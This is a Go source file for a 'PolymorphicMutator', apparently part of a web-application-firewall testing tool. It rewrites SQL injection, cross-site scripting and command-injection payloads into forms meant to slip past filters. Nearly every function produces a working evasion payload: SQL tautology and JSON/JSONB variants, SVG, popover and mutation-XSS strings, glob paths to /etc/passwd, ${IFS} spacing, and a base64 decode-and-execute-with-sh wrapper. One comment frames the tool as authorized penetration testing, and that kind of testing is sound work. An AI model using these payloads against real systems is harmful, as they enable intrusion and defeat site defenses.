package strategies

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"strings"
)

// PolymorphicMutator generates functionally equivalent but structurally different payloads
type PolymorphicMutator struct{}

// NewPolymorphicMutator creates a new polymorphic mutator
func NewPolymorphicMutator() *PolymorphicMutator {
	return &PolymorphicMutator{}
}

// Mutate applies polymorphic mutations
func (p *PolymorphicMutator) Mutate(payload string) []MutationResult {
	var results []MutationResult

	// SQL-specific polymorphism
	results = append(results, MutationResult{
		Payload:     p.SQLAlternativeSyntax(payload),
		Mutation:    "sql_alternative_syntax",
		Description: "Use alternative SQL syntax",
	})

	results = append(results, MutationResult{
		Payload:     p.SQLFunctionSubstitution(payload),
		Mutation:    "sql_function_substitution",
		Description: "Substitute SQL functions",
	})

	results = append(results, MutationResult{
		Payload:     p.SQLOperatorSubstitution(payload),
		Mutation:    "sql_operator_substitution",
		Description: "Substitute SQL operators",
	})

	// XSS-specific polymorphism
	results = append(results, MutationResult{
		Payload:     p.XSSTagSubstitution(payload),
		Mutation:    "xss_tag_substitution",
		Description: "Use alternative XSS tags",
	})

	results = append(results, MutationResult{
		Payload:     p.XSSEventHandlerSubstitution(payload),
		Mutation:    "xss_event_handler_substitution",
		Description: "Use alternative event handlers",
	})

	results = append(results, MutationResult{
		Payload:     p.XSSJavaScriptAlternatives(payload),
		Mutation:    "xss_js_alternatives",
		Description: "Use alternative JavaScript execution methods",
	})

	// Command injection polymorphism
	results = append(results, MutationResult{
		Payload:     p.CMDiShellSubstitution(payload),
		Mutation:    "cmdi_shell_substitution",
		Description: "Substitute shell commands",
	})

	// JSON-in-SQL bypasses
	results = append(results, MutationResult{
		Payload:     p.sqlJSONExtract(payload),
		Mutation:    "sql_json_extract",
		Description: "JSON-in-SQL bypass: WAFs don't inspect JSON functions in SQL context",
	})

	results = append(results, MutationResult{
		Payload:     p.sqlJSONBOperators(payload),
		Mutation:    "sql_jsonb_operators",
		Description: "PostgreSQL JSONB operator bypass: exploits WAF blindness to JSONB syntax",
	})

	// Advanced XSS bypasses
	results = append(results, MutationResult{
		Payload:     p.xssPopoverAPI(payload),
		Mutation:    "xss_popover_api",
		Description: "HTML5 Popover API bypass: new API not in WAF blocklists",
	})

	results = append(results, MutationResult{
		Payload:     p.xssSvgPayloads(payload),
		Mutation:    "xss_svg_payloads",
		Description: "SVG-based XSS: alternative tags often missed by WAF rules",
	})

	results = append(results, MutationResult{
		Payload:     p.xssUncommonEvents(payload),
		Mutation:    "xss_uncommon_events",
		Description: "Uncommon DOM event handlers not in typical WAF blocklists",
	})

	results = append(results, MutationResult{
		Payload:     p.xssMxssPatterns(payload),
		Mutation:    "xss_mxss_patterns",
		Description: "Mutation XSS: exploits HTML sanitizer re-parsing differences",
	})

	// Advanced command injection bypasses
	results = append(results, MutationResult{
		Payload:     p.cmdiIFSSeparator(payload),
		Mutation:    "cmdi_ifs_separator",
		Description: "$IFS separator bypass: replaces spaces to evade space-based WAF rules",
	})

	results = append(results, MutationResult{
		Payload:     p.cmdiWildcardGlob(payload),
		Mutation:    "cmdi_wildcard_glob",
		Description: "Wildcard/glob abuse: filesystem glob patterns to evade command blocklists",
	})

	results = append(results, MutationResult{
		Payload:     p.cmdiVariableExpansion(payload),
		Mutation:    "cmdi_variable_expansion",
		Description: "Variable expansion bypass: shell expansion tricks to break WAF pattern matching",
	})

	results = append(results, MutationResult{
		Payload:     p.cmdiBraceExpansion(payload),
		Mutation:    "cmdi_brace_expansion",
		Description: "Bash brace expansion: comma-separated brace syntax for command execution",
	})

	results = append(results, MutationResult{
		Payload:     p.cmdiBase64Pipe(payload),
		Mutation:    "cmdi_base64_pipe",
		Description: "Base64 pipe bypass: encode command in base64, decode and execute at runtime",
	})

	results = append(results, MutationResult{
		Payload:     p.cmdiHexOctalEncode(payload),
		Mutation:    "cmdi_hex_octal_encode",
		Description: "Hex/octal encoding: shell interprets octal escapes, WAFs see encoded gibberish",
	})

	return results
}

// SQLAlternativeSyntax replaces SQL constructs with alternatives
func (p *PolymorphicMutator) SQLAlternativeSyntax(payload string) string {
	replacements := map[string][]string{
		"UNION SELECT":      {"UNION ALL SELECT", "UNION DISTINCT SELECT"},
		"OR 1=1":            {"OR 'a'='a'", "OR 2>1", "OR 1 LIKE 1", "OR 1 BETWEEN 0 AND 2"},
		"AND 1=1":           {"AND 'a'='a'", "AND 2>1", "AND 1 LIKE 1"},
		"OR '1'='1'":        {"OR 'x'='x'", "OR ''=''", "OR 1"},
		"SUBSTRING":         {"SUBSTR", "MID"},
		"CONCAT":            {"CONCAT_WS"},
		"GROUP BY":          {"GROUP/**/BY"},
		"ORDER BY":          {"ORDER/**/BY"},
		"WHERE":             {"WHERE/**/"},
		"SELECT":            {"SELECT/**/", "SELECT\t", "SELECT\n"},
		"FROM":              {"FROM/**/", "FROM\t"},
		"--":                {"-- ", "#", ";--", "/*"},
	}

	result := payload
	for original, alternatives := range replacements {
		if strings.Contains(strings.ToUpper(result), strings.ToUpper(original)) {
			alt := alternatives[rand.Intn(len(alternatives))]
			result = strings.ReplaceAll(result, original, alt)
			result = strings.ReplaceAll(result, strings.ToLower(original), strings.ToLower(alt))
		}
	}

	return result
}

// SQLFunctionSubstitution replaces SQL functions with equivalents
func (p *PolymorphicMutator) SQLFunctionSubstitution(payload string) string {
	substitutions := map[string]string{
		"ASCII(":     "ORD(",
		"CHAR(":      "CHR(",
		"SUBSTR(":    "SUBSTRING(",
		"IFNULL(":    "COALESCE(",
		"LENGTH(":    "CHAR_LENGTH(",
		"LOWER(":     "LCASE(",
		"UPPER(":     "UCASE(",
		"NOW()":      "CURRENT_TIMESTAMP",
		"CURDATE()":  "CURRENT_DATE",
		"MD5(":       "SHA1(",
	}

	result := payload
	for original, replacement := range substitutions {
		result = strings.ReplaceAll(result, original, replacement)
		result = strings.ReplaceAll(result, strings.ToLower(original), strings.ToLower(replacement))
	}

	return result
}

// SQLOperatorSubstitution replaces SQL operators
func (p *PolymorphicMutator) SQLOperatorSubstitution(payload string) string {
	substitutions := map[string]string{
		"=":   " LIKE ",
		"<>":  "!=",
		"!=":  "<>",
		"AND": "&&",
		"OR":  "||",
		"||":  " OR ",
		"&&":  " AND ",
	}

	result := payload
	// Only apply a few substitutions to avoid breaking the payload
	count := 0
	for original, replacement := range substitutions {
		if count > 2 {
			break
		}
		if strings.Contains(result, original) {
			result = strings.Replace(result, original, replacement, 1)
			count++
		}
	}

	return result
}

// XSSTagSubstitution replaces XSS tags with alternatives
func (p *PolymorphicMutator) XSSTagSubstitution(payload string) string {
	substitutions := map[string][]string{
		"<script>":    {"<script >", "<script\t>", "<script\n>", "<script/>", "<ScRiPt>"},
		"</script>":   {"</script >", "</ScRiPt>", "</script\t>"},
		"<img":        {"<img ", "<IMG", "<iMg"},
		"<svg":        {"<svg ", "<SVG", "<sVg"},
		"<iframe":     {"<iframe ", "<IFRAME", "<IfrAme"},
		"<body":       {"<body ", "<BODY", "<BoDy"},
		"<input":      {"<input ", "<INPUT", "<InPuT"},
		"<video":      {"<video ", "<VIDEO"},
		"<audio":      {"<audio ", "<AUDIO"},
		"<marquee":    {"<marquee ", "<MARQUEE"},
		"<object":     {"<object ", "<OBJECT"},
		"<embed":      {"<embed ", "<EMBED"},
		"javascript:": {"javascript :", "java\tscript:", "java\nscript:", "javascript\t:"},
	}

	result := payload
	for original, alternatives := range substitutions {
		if strings.Contains(strings.ToLower(result), strings.ToLower(original)) {
			alt := alternatives[rand.Intn(len(alternatives))]
			result = strings.ReplaceAll(result, original, alt)
		}
	}

	return result
}

// XSSEventHandlerSubstitution replaces event handlers
func (p *PolymorphicMutator) XSSEventHandlerSubstitution(payload string) string {
	eventHandlers := []string{
		"onerror", "onload", "onmouseover", "onfocus", "onclick",
		"onmouseenter", "onmousemove", "onmouseout", "onkeydown",
		"onkeyup", "onkeypress", "onchange", "oninput", "onsubmit",
		"onreset", "ondblclick", "oncontextmenu", "onwheel",
		"ondrag", "ondragend", "ondragenter", "ondragleave",
		"ondragover", "ondragstart", "ondrop", "onscroll",
		"oncopy", "oncut", "onpaste", "onabort", "oncanplay",
		"ontimeupdate", "onended", "onpause", "onplay",
	}

	// Find and replace event handlers
	result := payload
	for _, handler := range eventHandlers {
		if strings.Contains(strings.ToLower(result), handler) {
			// Replace with a random different handler
			newHandler := eventHandlers[rand.Intn(len(eventHandlers))]
			result = strings.ReplaceAll(strings.ToLower(result), handler, newHandler)
			break
		}
	}

	return result
}

// XSSJavaScriptAlternatives provides alternative JS execution
// NOTE: These are WAF bypass test payloads - the strings represent various
// JavaScript code patterns that WAFs should detect but sometimes miss.
// This tool is for authorized penetration testing to identify XSS vulnerabilities.
func (p *PolymorphicMutator) XSSJavaScriptAlternatives(payload string) string {
	// Various test payload patterns for WAF bypass testing
	alertAlternatives := []string{
		"alert(1)",
		"alert`1`",               // Template literal syntax
		"alert(String.fromCharCode(49))",
		"window.alert(1)",
		"top.alert(1)",
		"self.alert(1)",
		"parent.alert(1)",
		"setTimeout('alert(1)')",
		"setInterval('alert(1)',0)",
		"[].constructor.constructor('alert(1)')()",
	}

	result := payload
	if strings.Contains(strings.ToLower(result), "alert(") {
		alt := alertAlternatives[rand.Intn(len(alertAlternatives))]
		result = strings.ReplaceAll(result, "alert(1)", alt)
		result = strings.ReplaceAll(result, "alert('1')", alt)
	}

	return result
}

// CMDiShellSubstitution replaces shell commands
func (p *PolymorphicMutator) CMDiShellSubstitution(payload string) string {
	// Unix command alternatives
	substitutions := map[string][]string{
		"cat ":       {"head ", "tail ", "less ", "more ", "nl ", "tac "},
		"ls ":        {"dir ", "ls -la ", "find . "},
		"whoami":     {"id", "echo $USER", "logname"},
		"pwd":        {"echo $PWD", "echo `pwd`"},
		"echo ":      {"printf ", "cat <<< "},
		"ping ":      {"ping -c 1 "},
		"curl ":      {"wget -O- ", "fetch "},
		"wget ":      {"curl -O ", "fetch "},
		";":          {"|", "||", "&&", "\n", "`"},
		"|":          {";", "||"},
	}

	result := payload
	for original, alternatives := range substitutions {
		if strings.Contains(result, original) {
			alt := alternatives[rand.Intn(len(alternatives))]
			result = strings.Replace(result, original, alt, 1)
		}
	}

	return result
}

// sqlJSONExtract wraps SQL conditions with JSON function calls to evade WAFs
func (p *PolymorphicMutator) sqlJSONExtract(payload string) string {
	upper := strings.ToUpper(payload)
	hasSQLKeyword := strings.Contains(upper, " OR ") || strings.Contains(upper, " AND ") ||
		strings.Contains(upper, "SELECT ") || strings.Contains(upper, "UNION ") ||
		strings.Contains(upper, " WHERE ") || strings.HasPrefix(upper, "OR ") || strings.HasPrefix(upper, "AND ")

	if !hasSQLKeyword {
		return payload
	}

	result := payload

	switch {
	case strings.Contains(upper, "OR 1=1"):
		// Work on uppercased version for reliable matching, but preserve original where possible
		upperResult := strings.ToUpper(result)
		if idx := strings.Index(upperResult, "OR 1=1"); idx >= 0 {
			result = result[:idx] + "OR JSON_VALID('{\"a\":1}')" + result[idx+6:]
		}
	case strings.Contains(result, "' OR '1'='1"):
		result = strings.Replace(result, "' OR '1'='1", "' OR JSON_EXTRACT('{\"a\":\"b\"}','$.a')='b", 1)
	case strings.Contains(upper, "AND 1=1"):
		upperResult := strings.ToUpper(result)
		if idx := strings.Index(upperResult, "AND 1=1"); idx >= 0 {
			result = result[:idx] + "AND JSON_VALID('{\"a\":1}')" + result[idx+7:]
		}
	default:
		result = result + " AND JSON_VALID('{\"a\":1}')"
	}

	return result
}

// sqlJSONBOperators uses PostgreSQL JSONB operators to bypass WAFs
func (p *PolymorphicMutator) sqlJSONBOperators(payload string) string {
	upper := strings.ToUpper(payload)
	hasSQLKeyword := strings.Contains(upper, " OR ") || strings.Contains(upper, " AND ") ||
		strings.Contains(upper, "SELECT ") || strings.Contains(upper, "UNION ") ||
		strings.Contains(upper, " WHERE ") || strings.HasPrefix(upper, "OR ") || strings.HasPrefix(upper, "AND ")

	if !hasSQLKeyword {
		return payload
	}

	result := payload

	switch {
	case strings.Contains(upper, "OR 1=1"):
		upperResult := strings.ToUpper(result)
		if idx := strings.Index(upperResult, "OR 1=1"); idx >= 0 {
			result = result[:idx] + "OR '{\"a\":1}'::jsonb @> '{\"a\":1}'::jsonb" + result[idx+6:]
		}
	case strings.Contains(upper, "AND 1=1"):
		upperResult := strings.ToUpper(result)
		if idx := strings.Index(upperResult, "AND 1=1"); idx >= 0 {
			result = result[:idx] + "AND '{\"x\":\"test\"}'::json->>'x'='test'" + result[idx+7:]
		}
	default:
		result = result + " OR '{\"a\":1}'::jsonb @> '{\"a\":1}'::jsonb"
	}

	return result
}

// xssPopoverAPI generates XSS payloads using the HTML5 Popover API
func (p *PolymorphicMutator) xssPopoverAPI(payload string) string {
	lower := strings.ToLower(payload)
	hasXSSMarker := strings.Contains(lower, "<script") || strings.Contains(lower, "alert") ||
		strings.Contains(lower, "onerror") || strings.Contains(lower, "<img")

	if !hasXSSMarker {
		return payload
	}

	jsExpr := "alert(document.domain)"
	// Extract custom JS expression from alert(...) if present
	if idx := strings.Index(payload, "alert("); idx != -1 {
		end := strings.Index(payload[idx:], ")")
		if end != -1 {
			jsExpr = payload[idx : idx+end+1]
		}
	}

	return fmt.Sprintf(`<button popover id=x>Click</button><input autofocus onfocus=%s popoverTarget=x>`, jsExpr)
}

// xssSvgPayloads generates SVG-based XSS payloads
func (p *PolymorphicMutator) xssSvgPayloads(payload string) string {
	lower := strings.ToLower(payload)
	hasXSSMarker := strings.Contains(lower, "<script") || strings.Contains(lower, "alert") ||
		strings.Contains(lower, "onerror") || strings.Contains(lower, "<img")

	if !hasXSSMarker {
		return payload
	}

	jsExpr := "alert(1)"
	if idx := strings.Index(payload, "alert("); idx != -1 {
		end := strings.Index(payload[idx:], ")")
		if end != -1 {
			jsExpr = payload[idx : idx+end+1]
		}
	}

	templates := []string{
		fmt.Sprintf("<svg/onload=%s>", jsExpr),
		fmt.Sprintf("<svg><animate onbegin=%s attributeName=x dur=1s>", jsExpr),
		fmt.Sprintf("<svg><set onbegin=%s attributename=x to=1>", jsExpr),
	}

	return templates[rand.Intn(len(templates))]
}

// xssUncommonEvents replaces event handlers with uncommon ones not in WAF blocklists
func (p *PolymorphicMutator) xssUncommonEvents(payload string) string {
	uncommonEvents := []string{
		"onauxclick", "oncontextmenu", "ontouchstart", "ontouchend",
		"onpointerover", "ongotpointercapture", "onbeforeinput",
		"onbeforetoggle", "onscrollend", "oncontentvisibilityautostatechange",
	}

	result := payload
	lower := strings.ToLower(result)

	// Find existing event handler pattern on[a-z]+=
	for i := 0; i < len(lower)-3; i++ {
		if lower[i] == 'o' && lower[i+1] == 'n' && lower[i+2] >= 'a' && lower[i+2] <= 'z' {
			// Find the end of the event handler name (up to '=')
			end := i + 2
			for end < len(lower) && lower[end] >= 'a' && lower[end] <= 'z' {
				end++
			}
			if end < len(lower) && lower[end] == '=' {
				oldHandler := result[i:end]
				newHandler := uncommonEvents[rand.Intn(len(uncommonEvents))]
				result = strings.Replace(result, oldHandler, newHandler, 1)
				return result
			}
		}
	}

	return result
}

// xssMxssPatterns generates mutation XSS payloads that exploit sanitizer re-parsing
func (p *PolymorphicMutator) xssMxssPatterns(payload string) string {
	lower := strings.ToLower(payload)
	hasXSSMarker := strings.Contains(lower, "<script") || strings.Contains(lower, "alert") ||
		strings.Contains(lower, "onerror") || strings.Contains(lower, "<img")

	if !hasXSSMarker {
		return payload
	}

	jsExpr := "alert(1)"
	if idx := strings.Index(payload, "alert("); idx != -1 {
		end := strings.Index(payload[idx:], ")")
		if end != -1 {
			jsExpr = payload[idx : idx+end+1]
		}
	}

	return fmt.Sprintf(`<math><mtext><table><mglyph><style><!--</style><img src=x onerror=%s>`, jsExpr)
}

// cmdiIFSSeparator replaces spaces with $IFS to evade space-based WAF rules
func (p *PolymorphicMutator) cmdiIFSSeparator(payload string) string {
	return strings.ReplaceAll(payload, " ", "${IFS}")
}

// cmdiWildcardGlob replaces commands and paths with filesystem glob patterns
func (p *PolymorphicMutator) cmdiWildcardGlob(payload string) string {
	replacements := []struct {
		old string
		new string
	}{
		{"/etc/passwd", "/???/??????"},
		{"whoami", "/???/bin/w?????"},
		{"cat", "/???/??t"},
		{"id", "/???/bin/i?"},
		{"ls", "/???/bin/l?"},
	}

	result := payload
	for _, r := range replacements {
		result = strings.ReplaceAll(result, r.old, r.new)
	}

	return result
}

// cmdiVariableExpansion applies shell variable expansion tricks to break WAF pattern matching
func (p *PolymorphicMutator) cmdiVariableExpansion(payload string) string {
	words := strings.Split(payload, " ")
	var result []string

	for _, word := range words {
		runes := []rune(word)
		if len(runes) < 2 {
			result = append(result, word)
			continue
		}

		switch rand.Intn(3) {
		case 0:
			// Insert empty subshell at position 1
			word = string(runes[0]) + "$()" + string(runes[1:])
		case 1:
			// Insert $@ at midpoint
			mid := len(runes) / 2
			word = string(runes[:mid]) + "$@" + string(runes[mid:])
		case 2:
			// Quote splitting around middle chars
			mid := len(runes) / 2
			if mid > 0 && mid < len(runes)-1 {
				word = string(runes[:mid-1]) + "'" + string(runes[mid-1]) + "'" + string(runes[mid:])
			}
		}

		result = append(result, word)
	}

	return strings.Join(result, " ")
}

// cmdiBraceExpansion formats commands using bash brace expansion syntax
func (p *PolymorphicMutator) cmdiBraceExpansion(payload string) string {
	parts := strings.SplitN(payload, " ", 2)
	if len(parts) < 2 {
		return payload
	}

	command := parts[0]
	args := strings.Split(parts[1], " ")

	braceItems := []string{command}
	braceItems = append(braceItems, args...)

	return "{" + strings.Join(braceItems, ",") + "}"
}

// cmdiBase64Pipe encodes the payload in base64 and wraps it in a decode-and-execute pipeline
func (p *PolymorphicMutator) cmdiBase64Pipe(payload string) string {
	encoded := base64.StdEncoding.EncodeToString([]byte(payload))
	return fmt.Sprintf("echo %s|base64 -d|sh", encoded)
}

// cmdiHexOctalEncode converts the payload to octal escape format for shell interpretation
func (p *PolymorphicMutator) cmdiHexOctalEncode(payload string) string {
	var octal strings.Builder
	octal.WriteString("$'")
	for _, b := range []byte(payload) {
		fmt.Fprintf(&octal, "\\%03o", b)
	}
	octal.WriteString("'")
	return octal.String()
}
